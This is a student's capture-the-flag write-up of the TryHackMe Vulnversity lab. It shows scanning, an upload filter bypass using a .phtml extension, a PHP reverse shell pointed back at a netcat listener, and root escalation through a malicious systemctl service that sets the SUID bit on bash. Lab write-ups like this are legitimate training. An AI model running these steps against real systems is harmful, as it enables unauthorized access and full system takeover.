
# 🔐 Vulnversity CTF Writeup (TryHackMe)

## 📌 Overview

This write-up documents the full exploitation process of the **Vulnversity** machine, covering reconnaissance, enumeration, initial access, and privilege escalation to root.

---

## 🛠️ Tools Used

* RustScan
* Nmap
* Feroxbuster
* Burp Suite
* Netcat
* PHP Reverse Shell (PentestMonkey)

---

## 🔎 Reconnaissance
<img width="933" height="681" alt="image" src="https://github.com/user-attachments/assets/4d120f5c-fa99-4645-b9bf-4950196b9bd8" />

### 🔹 Port Scanning

```bash
rustscan -a vulnver.thm -r 1-65535 -- -sV -sC -O
```
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 62 vsftpd 3.0.5
22/tcp   open  ssh         syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:bc:48:a4:b0:d2:ec:86:8f:42:b0:a6:e5:4b:79:39 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6m1DnP7qw9cVHdSoRvp+MJX2+4MP2e8n2yUUbGukyJOjPgrs6V8uhr+7Ut5Egqonf80YzngJ20eZ0W9PZ17oXw1H3FvM2K9+UE37D+qY4ZSyp2dmvrs/BY85P/Y0XffcGew3YIlNkLH/jLXqoPjfpQheDLqjwCKq8PoFqW7wa+bg8e+9lza8T/k7mrgP+CCgPlXNmIDMR3CP0aio933S5XplrqEwCY5b+q8GhFVtyTYqOz6PRDV4ZhutfWKuUlsPR3S/Rfwlt5M+DRCIaKOlYv6jYg18pQjQDaolig2y6mxLXy9FDYE9br+b+Rs5yBRg7rybVlxKssCFyhXVaqN2UgX18bX1rRZHc5A6Mhgrn+nlfi+NhNRVpkPoBfMa/tseXalQvVTzq3XoGqVeSSsSd84J69Q9JUhAGKaaTAeSODCy40gTHwsLFmWszi4Sl9IW/vd7xk3QRpdQ80GJ1xkvuQ44Yb6IcOxGDp6YpEY+mqC44d4cOCXyXO/n+02SbZes=
|   256 7b:95:63:a6:aa:b9:bc:a6:7a:5f:99:f1:1f:16:33:39 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPKbtnHYyRNSo5/1UFmUBhnH/GT2jdocG6idDbHsvgZTnM3uinQXByuHXoHJeFbAQwJGqFsO7nLuSAM/e3ddfGk=
|   256 56:15:5d:e0:0f:8d:80:3a:6f:c4:08:ab:36:dc:4e:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIObSnt42mEZmwsr0K0lsGnptcdDLAxDQVR2xqScMDisi
139/tcp  open  netbios-ssn syn-ack ttl 62 Samba smbd 4
445/tcp  open  netbios-ssn syn-ack ttl 62 Samba smbd 4
3128/tcp open  http-proxy  syn-ack ttl 62 Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.10
3333/tcp open  http        syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vuln University
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (94%), Linux 5.4 (94%), Android 10 - 11 (Linux 4.14) (92%), Sony X75CH-series Android TV (Android 5.0) (92%), Linux 2.6.32 (92%), Linux 3.7 - 4.19 (92%), Linux 5.0 - 6.2 (92%), QNAP QTS 4.0 - 4.2 (92%), Linux 3.2 - 4.14 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=3/25%OT=21%CT=%CU=42418%PV=Y%DS=3%DC=I%G=N%TM=69C36082%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
SEQ(SP=FA%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 29.507 days (since Mon Feb 23 21:01:41 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-03-25T04:11:38
|_  start_date: N/A
|_clock-skew: -2s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26480/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 61181/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34491/udp): CLEAN (Failed to receive data)
|   Check 4 (port 31510/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   <00>                 Flags: <unique><active>
|   <03>                 Flags: <unique><active>
|   <20>                 Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:11
Completed NSE at 09:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:11
Completed NSE at 09:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:11
Completed NSE at 09:11, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.75 seconds
           Raw packets sent: 54 (3.972KB) | Rcvd: 44 (24.120KB)
### 🔹 Open Ports & Services

* **21** → FTP (vsftpd 3.0.5)
* **22** → SSH (OpenSSH 8.2)
* **139/445** → SMB
* **3128** → Squid Proxy
* **3333** → HTTP (Apache 2.4.41)

---

## 🌐 Web Enumeration

### 🔹 Directory Bruteforce

```bash
feroxbuster -u http://TARGET_IP:3333/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

### 🔹 Interesting Findings

* `/internal/`
* `/internal/uploads/`

👉 Indicates a potential **file upload functionality**

---

## 💉 Exploitation – File Upload Bypass

### 🔹 Step 1: Intercept Upload Request

* Used **Burp Suite**
* Captured POST request to:

```
/internal/index.php
```

---

### 🔹 Step 2: Fuzz File Extensions

Tested extensions:

```
.php
.php3
.php4
.php5
.phtml
```

👉 `.phtml` was accepted ✅

---

### 🔹 Step 3: Upload Reverse Shell

Used **PentestMonkey PHP reverse shell**:

* Edited:

```php
$ip = 'YOUR_IP';
$port = 4444;
```

* Renamed file:

```
php-reverse-shell.phtml
```

---

### 🔹 Step 4: Start Listener

```bash
nc -lvnp 4444
```

---

### 🔹 Step 5: Trigger Shell

```
http://TARGET_IP:3333/internal/uploads/php-reverse-shell.phtml
```

👉 Got shell as:

```
www-data
```

---

## 🧑‍💻 Initial Access

```bash
whoami
www-data
```

---

## 📂 User Flag

```bash
cd /home/bill
cat user.txt
```

---

## 🔐 Privilege Escalation

### 🔹 Step 1: Check SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

---

### 🔹 Step 2: Abuse systemctl (Misconfiguration)

Created a malicious service file:

```bash
TF=$(mktemp).service

cat << EOF > $TF
[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target
EOF
```

---

### 🔹 Step 3: Link and Execute Service

```bash
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

---

### 🔹 Step 4: Spawn Root Shell

```bash
/bin/bash -p
```

👉 Root access obtained 💀

---

## 🏁 Root Flag

```bash
cd /root
cat root.txt
```

---

## 🎯 Key Takeaways

* File upload filters can often be bypassed using alternative extensions like `.phtml`
* Always check for:

  * SUID binaries
  * Misconfigured services
* `systemctl` can be abused for privilege escalation if improperly configured
* Reverse shells remain a powerful technique in web exploitation

---

## ⚠️ Disclaimer

This write-up is for educational purposes only. All activities were performed in a controlled lab environment (TryHackMe).

---

## 👨‍💻 Author

**Faiq (Cybersecurity Student | Penetration Tester)**
